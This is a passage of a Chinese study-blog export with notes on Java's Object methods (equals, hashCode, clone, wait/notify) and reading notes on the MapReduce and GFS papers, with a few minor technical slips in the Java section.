<li>如果该方法被覆盖，那么我们认为比较的两个对象是相等的。</li>
</ul>
<p>注意：<code>==</code> 比较这两个对象是否是同一个对象；<code>equals</code> 比较这两个对象是否相等。在默认情况下，<code>A==B</code> &lt;=&gt; <code>A.equals(B)</code>；在覆盖过方法的情况下，<code>A==B</code> =&gt; <code>A.equals(B)</code> </p>
<h3 id="重写-equals-方法"><a href="#重写-equals-方法" class="headerlink" title="重写 equals 方法"></a>重写 equals 方法</h3><p>重写后的 equals 方法应该满足以下五个条件：</p>
<ol>
<li>自反性(reflexive)：对于任何非空(null)对象，<code>x.equals(x) == true</code> 恒成立</li>
<li>对称性(symmetric)：对于任何非空(null)对象，<code>x.equals(y) == y.equals(x)</code> 恒成立</li>
<li>传递性(transitive)：对于任何非空(null)对象，若<code>x.equals(y) == y.equals(z)</code> ，必有<code>x.equals(z) == true</code></li>
<li>一致性(consistent)：对于任何非空(null)对象，<code>x.equals(y)</code> 的值在多次调用中始终不变</li>
<li>非空性(non-null)：对于任何非空(null)对象，<code>x.equals(null) == false</code> 恒成立</li>
</ol>
<blockquote>
<p>为什么要强调非空(null)对象呢？因为如果 x 引用的是 null 的话。那么它根本就没有 <code>equals()</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">null</span>;</span><br><span class="line">System.out.println(test==<span class="keyword">null</span>);			<span class="comment">// true,因为 == 是比较地址的</span></span><br><span class="line">System.out.println(test.equals(<span class="keyword">null</span>));	<span class="comment">// java.lang.NullPointerException</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>很显然，前面三个条件（自反对称传递）也就是集合论中定义的一个<strong>划分</strong>，即体现了这两个集合的<strong>等价关系</strong>。<del>如果上一句话看不懂建议重修离散数学。</del></p>
<h3 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h3><p>Java<u>基本类型的包装类</u>的大部分都实现了常量池技术，即Byte，Short，Integer，Long，Character，Boolean；前面4种包装类默认创建了[-128，128]的相应类型的缓存数据，Character创建了数值在[O，127]范围的数据，Boolean直接返回 True Or false.如果超出对应范围仍然会去创建新的。</p>
<p>对于浮点数的包装类 Float，Double并没有常量池。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer a = <span class="number">127</span>;</span><br><span class="line">Integer b = <span class="number">127</span>;</span><br><span class="line">a == b;				<span class="comment">// true,它们指向同一个对象</span></span><br><span class="line">a.equal(b);			<span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">Integer a = <span class="number">129</span>;</span><br><span class="line">Integer b = <span class="number">129</span>;</span><br><span class="line">a == b;				<span class="comment">// false,它们指向不同的对象</span></span><br><span class="line">a.equal(b);			<span class="comment">// true,它们确实相等</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Integer a = <span class="number">127</span>;</span><br><span class="line">Integer b = <span class="keyword">new</span> Integer(<span class="number">127</span>);	<span class="comment">// 这种情况下b会创建新的对象</span></span><br><span class="line">a == b;				<span class="comment">// false,它们指向不同的对象</span></span><br><span class="line">a.equal(b);			<span class="comment">// true,它们确实相等</span></span><br></pre></td></tr></table></figure>
<h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h2><p>这个方法用于返回该对象的 Hash 值。这里不介绍 Hash 值的意义和用途。</p>
<p>该方法会返回一个 int 整型。</p>
<blockquote>
<p>该方法规约如下：</p>
<ol>
<li>在一次程序运行中，对同一个对象多次求哈希值的返回值应当相同。但在同一个程序的多次运行中，并不要求它们的Hash值总是相同</li>
<li>若 <code>A.equals(B)</code>, 则 <code>A.hashCode() == B.hashCode()</code></li>
<li>若 <code>A.hashCode() == B.hashCode()</code>，<strong>未必有</strong> <code>A.equals(B)</code>，也<strong>未必有</strong> <code>A == B</code></li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>native 修饰符：A native method is a Java method whose implementation is provided by non-java code. 本地方法是使用其他语言编写的 Java 方法，它取决于具体的 JVM。</li>
<li>该方法的默认行为一般为将对象在堆上的地址转化为整型返回，但是这在实现时并不是必需的。</li>
</ul>
<h3 id="hashCode-与-equals"><a href="#hashCode-与-equals" class="headerlink" title="hashCode 与 equals"></a>hashCode 与 equals</h3><p>由于 hashCode 方法默认是根据对象的内存地址生成的。考虑以下关系：</p>
<blockquote>
<ol>
<li>若 <code>A == B</code> 为真，则必有 <code>A.equals(B) == true</code></li>
<li>若 <code>A.equals(B) == true</code>，则 <code>A == B</code> 未必为真</li>
<li>若 <code>A.equals(B)</code>, 则 <code>A.hashCode() == B.hashCode()</code></li>
<li>在默认情况下，若 <code>A == B</code> 为真，则 <code>A.hashCode() == B.hashCode()</code></li>
</ol>
</blockquote>
<p>不难推理出，由于 equals 并不要求两对象的内存地址相同，因此 hashCode 方法应当随着 equals 方法的重写而重写。</p>
<h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><blockquote>
<p>返回该对象运行时的类</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> Class&lt;?&gt; getClass();</span><br></pre></td></tr></table></figure>
<p>显然这也是一个本地方法，并且不可被重写。</p>
<ul>
<li>注意返回的是对象的运行时的类，联系多态，理解下面第四行代码</li>
<li>Java 泛型是类型擦除的。因此泛型中的值不会显式。<ul>
<li>类型擦除：指JVM并不会意识到泛型信息</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test a = <span class="keyword">new</span> subTest();</span><br><span class="line">List&lt;String&gt; b = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; c = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">System.out.println(a.getClass());		<span class="comment">// class StudyObject.subTest</span></span><br><span class="line">System.out.println(b.getClass());		<span class="comment">// class java.util.ArrayList</span></span><br><span class="line">System.out.println(c.getClass());		<span class="comment">// class java.util.ArrayList</span></span><br></pre></td></tr></table></figure>
<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h2><blockquote>
<p>返回对象的字符串表示形式。该方法应该言简意丰、便于阅读，建议所有类重写该方法。</p>
<p>如果未重写该方法，会以 <code>&quot;&lt;类名&gt; + &#39;@&#39; + &lt;0xHash值&gt;&quot;</code> 的形式返回。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">"@"</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><blockquote>
<p>复制出当前对象的一个拷贝。对”拷贝”的定义因类型而异，一般性的共识是满足以下条件</p>
<ul>
<li><code>A != B</code>    并不是<strong>同一个</strong>对象</li>
<li><code>A.getClass() == B.getClass()</code>   是同一类对象</li>
<li><code>A.equals() == B.equals()</code>       两个对象的相等的</li>
</ul>
<p>只有实现了 <code>Cloneable</code> 接口的类才允许调用本方法，否则会抛出 <code>CloneNotSupportedException</code> 异常。</p>
<p>默认为浅拷贝</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure>
<p>显然这也是一个本地方法</p>
<h3 id="Cloneable-接口"><a href="#Cloneable-接口" class="headerlink" title="Cloneable 接口"></a>Cloneable 接口</h3><p>只有实现了本接口的类才被允许使用 Object 中的 clone() 方法。否则会抛出 <code>CloneNotSupportedException</code> 异常。</p>
<p>Cloneable 是一个标记接口，并不需要真的实现任何方法，仅作标记使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里面真的啥也没有哦</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="浅拷贝与深拷贝"><a href="#浅拷贝与深拷贝" class="headerlink" title="浅拷贝与深拷贝"></a>浅拷贝与深拷贝</h3><p>浅拷贝：对基本数据类型进行值传递，对引用数据类型进行引用传递般的拷贝。</p>
<p>深拷贝：对基本数据类型进行值传递，对引用数据类型，创建一个新的对象，并复制为深拷贝。即递归拷贝</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202012/21/image-20201221040503225.png" alt="image-20201221040503225" style="zoom:50%;" /></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202012/21/image-20201221040618638.png" alt="image-20201221040618638" style="zoom:50%;" /></p>
<h2 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h2><blockquote>
<p>该方法自 JDK9 起被废弃。</p>
</blockquote>
<p>当GC认为它不在需要这个对象时，会调用该函数。</p>
<h2 id="wait-notify-notifyAll"><a href="#wait-notify-notifyAll" class="headerlink" title="wait/notify/notifyAll"></a>wait/notify/notifyAll</h2><blockquote>
<p>均为本地(naive)方法</p>
</blockquote>
<p>这三个函数均涉及到并发编程，<u>下面的内容可能需要一定的并发编程和操作系统基础才能继续阅读</u>。</p>
<p>在操作系统中我们曾经涉及到管程(Monitor)的概念，Java 通过sychronyzed关键字，和wait()、notify()、notifyAll() 方法实现了整个管程模型。(好像 Java 一般会把 Monitor 翻译成监视器)</p>
<blockquote>
<p>锁池:假设线程A已经拥有了某个对象(注意:不是类)的锁，而其它的线程想要调用这个对象的某个 synchronized 方法(或者 synchronized 块)，由于这些线程在进入对象的synchronized方法之前必须先获得该对象的锁的拥有权，但是该对象的锁目前正被线程A拥有，所以这些线程就进入了该对象的锁池中。</p>
<p>等待池:假设一个线程A调用了某个对象的wait()方法，线程A就会<strong>释放该对象的锁</strong>后，进入到了该对象的等待池。</p>
<p>如果线程调用了对象的 wait()方法，那么线程便会处于该对象的<strong>等待池</strong>中，等待池中的线程<strong>不会去竞争该对象的锁</strong>。</p>
<p>当有线程调用了对象的 <strong>notifyAll</strong>()方法（唤醒所有 wait 线程）或 <strong>notify</strong>()方法（只随机唤醒一个 wait 线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。也就是说，调用了notify后只要一个线程会由等待池进入锁池，而notifyAll会将该对象等待池内的所有线程移动到锁池中，等待锁竞争</p>
<p>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它<strong>还会留在锁池中</strong>，唯有线程再次调用 wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了 synchronized 代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</p>
<p>作者：大王叫我来巡山<br>链接：<a href="https://www.zhihu.com/question/37601861/answer/145545371" target="_blank" rel="noopener">https://www.zhihu.com/question/37601861/answer/145545371</a></p>
</blockquote>
<h3 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h3><p>此方法导致当前线程（称为 T）将自己置于该对象的等待池(the wait set)中，然后放弃关于此对象的所有同步声明(即释放锁）。线程 T 将出于线程调度目的而被禁用，并且处于休眠状态，直到发生四件事之一：</p>
<ol>
<li>某个拥有 Monitor 的线程调用了该对象的 notify() 方法并且线程 T 正好被选中</li>
<li>某个拥有 Monitor 的线程调用了该对象的 notifyAll() 方法</li>
<li>其他线程中断(interrupt())了线程 T</li>
<li>使用 wait(long timeout) 方法时设定的时间已过</li>
</ol>
<p>当发生了上述四种情况之一时，线程 T 进入从等待池中进入锁池(注意此时还不能直接开始运行)。在锁空出时竞争锁资源，如果竞争成功则从调用 wait() 方法处开始运行；如果竞争失败则继续停留在锁池中(并不会返回到等待池中)。</p>
<p>在个别情况下可能会出现虚假唤醒的可能性，这是指由于 CPU 调度导致的、在上述事件发生时同时唤醒了多个线程的情况(更多关于虚假唤醒的请参考操作系统的 IPC 部分)。因此在代码中需要显性地使用 while 来规避，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line"><span class="keyword">synchronized</span> (obj) &#123;</span><br><span class="line">	<span class="keyword">if</span> (condition does not hold)</span><br><span class="line">		obj.wait();</span><br><span class="line">		... <span class="comment">// Perform action appropriate to condition</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 正确写法</span></span><br><span class="line"><span class="keyword">synchronized</span> (obj) &#123;</span><br><span class="line">	<span class="keyword">while</span> (condition does not hold)</span><br><span class="line">		obj.wait();</span><br><span class="line">		... <span class="comment">// Perform action appropriate to condition</span></span><br><span class="line">            <span class="comment">// 当发生虚假唤醒时, while 可以帮助我们持续检查条件, 从而补救这一情况</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>wait() 方法具有两个重载：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>wait(long timeout)</td>
<td>timeout 为当前线程 T 的等待时间(ms)<br>若超出时长，T 将被唤醒<br>若时长设定为0，则不会自动唤醒</td>
</tr>
<tr>
<td>wait(long timeout, int nanos)</td>
<td>timeout 定义同上<br>nanos 定义类似，单位为纳秒(ns)<br>nanos 合法值为0~999999<br>若超出时长，T 将被唤醒</td>
</tr>
</tbody>
</table>
</div>
<h3 id="notify"><a href="#notify" class="headerlink" title="notify()"></a>notify()</h3><p>唤醒当前对象的<strong>某个</strong>处于等待池中的线程 T。具体是哪个线程是任意选择的。线程 T 被唤醒时将处于锁池中，等到当前线程放弃该对象的锁后才可以参与竞争进而获得锁并运行。</p>
<p>此方法仅可以由对象的 Monitor 的拥有者调用，线程通过以下三种情况成为拥有者：</p>
<ol>
<li>通过执行该对象的 synchronized 实例方法</li>
<li>通过执行该对象的 synchronized 代码块</li>
<li>通过执行某类的 synchronized static 方法</li>
</ol>
<p>一次只能有一个线程拥有对象的监视器</p>
<h3 id="notifyAll"><a href="#notifyAll" class="headerlink" title="notifyAll()"></a>notifyAll()</h3><p>这是与上述类似的方法，不同之处在于它将唤醒当前对象的处于等待池中的<strong>所有线程</strong>。线程(们)被唤醒时将处于锁池中，等到当前线程放弃该对象的锁后才可以参与竞争进而获得锁并运行。</p>
<p>此方法仅可以由对象的 Monitor 的拥有者调用。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Java</category>
        <category>Java基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>MapReduce_2004_Note</title>
    <url>/2021/05/11/MapReduce-2004-Note/</url>
    <content><![CDATA[<p>这是2004年的分布式论文 Map Reduce的阅读笔记。</p>
<p>论文链接🔗 <a href="https://pdos.csail.mit.edu/6.824/papers/mapreduce.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.824/papers/mapreduce.pdf</a></p>
<a id="more"></a>
<h2 id="文章笔记"><a href="#文章笔记" class="headerlink" title="文章笔记"></a>文章笔记</h2><p>对于每个段落进行概述。</p>
<h3 id="摘要-Abstract"><a href="#摘要-Abstract" class="headerlink" title="摘要 Abstract"></a>摘要 Abstract</h3><ol>
<li>MapReduce是一个编程模型，专门用于处理、产生海量数据集的实现。</li>
<li>用户使用 map 与 reduce 两个方法来达成目标，这两个方法的具体使用在第二部分介绍。</li>
<li>这种编程模型所产生的程序便于实行并行化，并且对外不需要关心有关分布式的细节：例如分割输入数据、集群上的调度、容错处理以及机器间通信。便于无经验的开发人员使用。</li>
<li>它可以运行在由普通机器组成的集群上，而这个集群的规模可以灵活调整。</li>
</ol>
<ol>
<li><h3 id="介绍-Introduction"><a href="#介绍-Introduction" class="headerlink" title="介绍 Introduction"></a>介绍 Introduction</h3></li>
<li><p>在过去，人们编写了大量的用于计算海量数据的程序，例如…（略）</p>
</li>
<li>这些程序的数据计算量是很大的，导致时间上的成本不可接受——唯一的解决方案是并行化处理。</li>
<li>并行化处理带来了更多的问题，并将简单的计算变成了复杂的工程。这些问题例如：how to parallelize the computation, distribute the data, and handle failure</li>
<li>因此我们设计了一种新的模型来隐藏并行化、容错、分布数据以及负载均衡等细节。</li>
<li>我们采用了the map and reduce方案：</li>
</ol>
<p>We realized that most of our computations involved applying a map operation to each logical “record” in our input in order to compute a set of intermediate key/value pairs, </p>
<p>and then applying a reduce operation to all the values that shared the same key, in order to combine the derived data appropriately. </p>
<p>Our use of a functional model with userspecified map and reduce operations allows us to parallelize large computations easily and to use re-execution as the primary mechanism for fault tolerance.</p>
<ol>
<li>这个设计的主要贡献是，通过简单有用的接口来实现自动的并行化和大规模分布式计算，通过这个接口设计，可以在大量普通的PC机上实现高性能计算。</li>
</ol>
<h3 id="2、程序模型-Programming-Model"><a href="#2、程序模型-Programming-Model" class="headerlink" title="2、程序模型 Programming Model"></a>2、程序模型 Programming Model</h3><p>整个程序的输入（input）为：一个 k-v 键值对的集合；输出（output）为：一个 k-v 键值对的集合；计算过程中包括两个用户自定义的函数：map 和 reduce，</p>
<p>Map：</p>
<p>input：从input集合中取出一个 k-v 对（k1, v1）</p>
<p>output：计算得到一堆的键值对 set(k2,v2)，我们将这一阶段的输出称为 intermediate file </p>
<p>Reduce:</p>
<p>input：从Map的计算结果中得到某一键和一系列的值（k2, list(v2)）</p>
<p>output：根据需要处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 从一个 k-v 中得到set(k2,v2)</span><br><span class="line">map(String key,String value):</span><br><span class="line">    &#x2F;&#x2F;key:文档的名字</span><br><span class="line">    &#x2F;&#x2F;value:文档的内容</span><br><span class="line">    for each word w in value:</span><br><span class="line">        EmitIntermediate(w,&quot;1&quot;);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;从之前的结果中获取一个k和对应的一系列v</span><br><span class="line">reduce(String key,Iterator values):</span><br><span class="line">    &#x2F;&#x2F;key:一个词</span><br><span class="line">    &#x2F;&#x2F;values:一个计数列表</span><br><span class="line">    int result&#x3D;0;</span><br><span class="line">    for each v in values:</span><br><span class="line">        result+&#x3D;ParseInt(v);</span><br><span class="line">     Emit(AsString(resut));</span><br></pre></td></tr></table></figure>
<h3 id="3、实现-Implementation"><a href="#3、实现-Implementation" class="headerlink" title="3、实现 Implementation"></a>3、实现 Implementation</h3><p>MapReduce接口可以有不同的实现，但是正如我们所说，这个接口的主要贡献就是，通过简单有用的接口来实现自动的并行化和大规模分布式计算。因此我们将着重介绍每个节点是如何分配工作、如何协作的。</p>
<h4 id="3-1、Overview"><a href="#3-1、Overview" class="headerlink" title="3.1、Overview"></a>3.1、Overview</h4><p>​                 <img src="https://docimg7.docs.qq.com/image/hAQBWzDu5llyE4ubcrlOHQ?w=1087&amp;h=779" alt="img">        </p>
<p>Map 操作被分布至多个机器之上分别运行，将原始数据分成 M 片（splits）进行处理。Reduce操作同样如此，我们根据 intermediate value 的key作为依据来进行分割成R块来进行处理。例如hash(key) mod R ，当然这里的分割算法是用户自定的。</p>
<p>走一下全部的流程：</p>
<ol>
<li>首先将所有的输入文件划分为 M 片，每个片的大小一般从 16到64MB(用户可以通过可选的参数来控制). 随后，在集群中我们将会开始大量地拷贝 mapreduce 程序。</li>
<li>在集群中的程序拷贝中，有一个是用于分配任务的master，其他的都是由master分配任务的worker.有M 个map任务和R个reduce任务将被分配.</li>
<li>一个执行 map 任务的 worker 会将它所负责的 split 读取，并进行 map 计算。输出的 intermediate k-v 对会暂存在内存之中。</li>
<li>缓存在内存中的中间结果被周期性地刷写到（本地）磁盘之上，这些中间结果随后会被Reduce过程中使用。这些被写入磁盘中的中间文件的location会被传递到master中，并且被master将地址调度到reduce worker处</li>
<li>reduce worker接收到来自master的location消息后，使用远程调用来读取磁盘中的中间数据，并对读取到的数据进行排序（如果数据量过大，可能还要外部排序）。排序的理由是：往往不同key的中间结果被分配到了同一个worker中，因此需要将相同key的内容聚合在一起。</li>
<li>reduce worker 对于每一个中间key，启动一个reduce任务，并使用自定的reduce函数将这个key与一系列value计算出输出结果，将结果追加到输出文件之中。</li>
<li>在所有的任务完成后，master节点唤醒用户程序，并且将最终结果返回。</li>
</ol>
<p>最终的输出结果存放在 R 个文件中，每一个 Reduce 任务都产生一个文件。一般而言用户不会直接使用这些输出结果——他们往往会将结果作为另外一个输入传递到其他的MapReduce调用,或者在可以处理多个分割文件的分布式应用中使用他们.</p>
<h4 id="3-2、Master"><a href="#3-2、Master" class="headerlink" title="3.2、Master"></a>3.2、Master</h4><p>Master节点会存储每个Map/Reduce 任务的状态（idle, in-progress, or completed）以及执行该任务的worker的标识符（只有后两种状态的任务会有对应worker）。</p>
<p>Master负责将map阶段完成的结果划分为 R 块，并且追加到reduce worker上，它扮演了一个管道的角色。</p>
<h4 id="3-3、容错"><a href="#3-3、容错" class="headerlink" title="3.3、容错"></a>3.3、容错</h4><p>在成百上千个机器组成的集群中，发生错误才是正常现象</p>
<h5 id="Worker-Failue"><a href="#Worker-Failue" class="headerlink" title="Worker Failue"></a>Worker Failue</h5><p>master周期性的ping每个worker. </p>
<p>如果master在一个确定的时间段内没有收到worker返回的信息,那么它将把这个worker标记成失效.</p>
<p>该节点上的已经完成map任务被重新设置成它初始的idle状态, 然后被安排给其他的worker.</p>
<p>该节点上的正在运行的map或reduce任务,也被重新设置成空闲状态,并且将被重新调度.</p>
<p>由于 Map 阶段的结果被存储在了该节点的本地磁盘上，后续的reduce节点将无法访问它们，所以完成态的map需要被重新运行；而reduce阶段的结果被存储在全局文件系统之中，所以只需要重新运行未完成的reduce任务即可。</p>
<p>Map worker A失效会通知到所有的Reduce worker，并且它们会在读取A的文件时从新调度的map worker B中读取文件。</p>
<h5 id="Master-Failue"><a href="#Master-Failue" class="headerlink" title="Master Failue"></a>Master Failue</h5><p>周期性地写入Master的状态，并在失效后从检查点回滚</p>
<h5 id="Semantics-in-the-Presence-of-Failures"><a href="#Semantics-in-the-Presence-of-Failures" class="headerlink" title="Semantics in the Presence of Failures"></a>Semantics in the Presence of Failures</h5><p>任何一个阶段的操作对于文件的读写都是原子性的。</p>
<p>Reduce 阶段会在本地磁盘中生成一个临时文件，并且在任务完成后调用 rename() 方法（这个方法是由文件系统支持的）来将临时文件重命名为最终输出文档到全局文件系统中。如果有多个Reduce worker执行了同样的任务，那么他们的输出文档将会被命名为同样的名称。</p>
<p>Map 阶段会在 Map worker的本地磁盘中生成R个文件，因为 Map 的输入是乱序的，而中间结果的输出将会被输入到R个不同的节点之中。</p>
<p>如果用户的Map/Reduce方法都是确定的——同样的输入得到同样的输出，那么经过整个流程后输出文件也是确定的；如果他们不是确定的话，那么不同顺序下的输出可能会不一样。</p>
<h4 id="3-4、存储位置"><a href="#3-4、存储位置" class="headerlink" title="3.4、存储位置"></a>3.4、存储位置</h4><p>尽可能是的数据存储在本地，以便节省网络带宽。</p>
<h4 id="3-5、任务粒度"><a href="#3-5、任务粒度" class="headerlink" title="3.5、任务粒度"></a>3.5、任务粒度</h4><p>我们细分map阶段成M个片,reduce阶段成R个片.</p>
<p>M和R应当比worker机器的数量大许多.每个worker执行许多不同的工作来提高动态负载均衡,也可以加速从一个worker失效中的恢复</p>
<p>但是 R 的数量经常会被用户限制，因为他们可能并不希望获得过多的输出文件。</p>
<h4 id="3-6、-Backup-Tasks"><a href="#3-6、-Backup-Tasks" class="headerlink" title="3.6、 Backup Tasks"></a>3.6、 Backup Tasks</h4><p>可能会存在落后者的问题，某些任务在执行中由于各种各样的问题导致计算过程的极度缓慢。（例如，磁盘读写突然莫名原因降至3MB/s）这将导致系统的瓶颈被限制到了某个（不确定的）机器上。</p>
<p>我们有一个一般的机制来减轻这个落后者的问题.当一个MapReduce操作将要完成的时候,master调度备用进程来执行那些剩下的还在执行的任务. 只要任意一些节点完成了剩下的任务，那么我们就视为完全完成了所有的任务。,通常只会占用多几个百分点的机器资源.我们发现这可以显著的减少完成大规模MapReduce操作的时间.</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>乘龙术</category>
        <category>分布式系统</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title>GFS论文笔记</title>
    <url>/2021/05/27/GFS%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Google File System，是一个可伸缩的、用于海量分布式数据类型应用的分布式文件系统。</p>
<p>关键词：容错性、可伸缩性、数据存储、集群存储</p>
<a id="more"></a>
<p>原文链接：<a href="https://pdos.csail.mit.edu/6.824/papers/gfs.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.824/papers/gfs.pdf</a></p>
<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/liyulong1982/p/6001841.html" target="_blank" rel="noopener">中文机翻</a></p>
<p><a href="https://mr-dai.github.io/gfs/#GFS-的主要需求" target="_blank" rel="noopener">GFS 总结</a></p>
<h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><ol>
<li><p>和其他布式文件系统类似，它设计时的目标包括：较好的性能、灵活的扩展性、高可靠性以及高可用性（performance, scalability, reliability, and availability）</p>
</li>
<li><p>但GFS在设计时还考虑了在大数据下的应用的负载（ application workloads），以及当前的技术环境（ technological environment）。这些考量使得GFS与其他系统有较大的区别。下面列举几点GFS设计时的考量：</p>
</li>
<li><ol>
<li>假设组件失效（component failures）是机器集群的常态。考虑到，我们的机器集群的规模之大、以及单位成本之低（quantity and quality of the components）。这使得单一机器的可靠性并不是那么高（成本限制），而保证集群中的所有机器同时处于可靠状态的几率更小（规模限制）。这些失效可能各种各样：application bugs, operating system bugs, human errors, and the failures of disks, memory, connectors, networking, and power supplies. </li>
<li>文档的尺寸往往是极大的。GB、甚至TB级别的文件是常态，而KB级别的小文件是较少的。因此在设计时，我们基于大文件重新审视了一些参数，例如IO操作与块的大小（I/O operation and block sizes ）我们支持KB级别的文件处理，但并不会专门去优化它。</li>
<li>顺序写，而非随机写。大部分文件的变更是采用在追加新数据，而不是重写原有数据的方式。随机写的模式在实际中几乎不存在。一旦写完之后，文件只能读（甚至通常只能顺序读）。考虑到这种针对海量文件的访问模式，我们将性能优化和原子性保证的设计重点放在了数据的追加上（appending ）。此外，客户端对数据块缓存毫无吸引力。</li>
<li>我们选择应用程序和文件系统API的协同设计，这样可以增加系统的灵活性，并进而有利于系统。例如，我们放松了对GFS一致性模型的要求，不用在应用程序中强加繁重负担，大大简化了文件系统；引入了原子性的追加操作，这样多个客户端可以对一个文件同时进行追加操作，不需要他俩之间额外的同步机制。这些后文会进一步了解。</li>
</ol>
</li>
<li><p>目前（2003）最大的一个GFS集群拥有超过1000个存储节点，超过300TB的硬盘存储，被不同机器上的数百个客户端连续不断的频繁访问。</p>
</li>
</ol>
<h2 id="DESIGN-OVERVIEW"><a href="#DESIGN-OVERVIEW" class="headerlink" title="DESIGN OVERVIEW"></a>DESIGN OVERVIEW</h2><h3 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h3><p>系统的设计基于以下假设：</p>
<ul>
<li>系统的组件会频繁失效，前述此略；</li>
<li>系统主要针对大文件进行优化，前述此略；</li>
<li>读取方式主要有两种，（大规模的）流式读与（小规模的）随机读；来自同一个客户机的连续操作通常是大规模的读取一个文件中一个连续区域。小规模的随机读取通常是在任意位移上读取几个KB数据；</li>
<li>写入方式主要也有两种。大规模的、顺序的、对文件追加数据的写操作。数据一旦被写入后，文件很少被再次变更。系统支持在文件任意位置写入的小数据的操作，但没有针对这种操作进行优化。</li>
<li>高可持续的网络带宽比低延迟更重要。我们很看重高速率大批量地处理数据，哪怕其响应速度相对较慢，极少有程序对单一的读写操作有严格的响应时间要求。</li>
</ul>
<h3 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h3><ol>
<li>整个GFS体系中包括一个Master节点和多个 Chunkservers 节点。客户端Client再与它们交互</li>
<li>文件会被分为等大小的块（chunks）。每个文件块都被赋予一个64bit长、不可变的标识符，称为块句柄（chunk handle）。Chunkserver 将块保存在本地硬盘上，并且根据指定的块句柄和字节范围来读写数据。每个块都会被冗余存储在不同的 Chunkserver 节点上（默认冗余3份）。</li>
<li>Master节点用于保存文件系统的元数据（metadata），而具体的文件数据被存放在 Chunkserver 的本地磁盘上。具体内容见 2.4</li>
<li>Chunkserver、Client 均不会缓存文件数据。客户端的理由是，文件过大且少有会被重复处理的、缓存的收益低。Chunkserver的理由是，数据本身就是以文件存储于系统上的，系统本身提供了缓存功能。但是客户端会缓存元数据，以减少与Master的通信。</li>
</ol>
<p>​                 <img src="https://docimg10.docs.qq.com/image/O8jymWznOVP7uB2mqw223A?w=927&amp;h=396" alt="img">        </p>
<p>见上图。Client先向Master通信，拿到需要的文件块以及offset等相关信息；Cilent再与Chunkserver通信，获得具体的文件数据。具体</p>
<h3 id="Single-Master"><a href="#Single-Master" class="headerlink" title="Single Master"></a>Single Master</h3><p>系统中仅有一个Master，这种 设计能够简化系统，并且不需要Master花费性能用于多Master的同步开销上。但是受限于此，单节点可能称为系统的瓶颈，这使得设计时尽量将职责从Master上转移。</p>
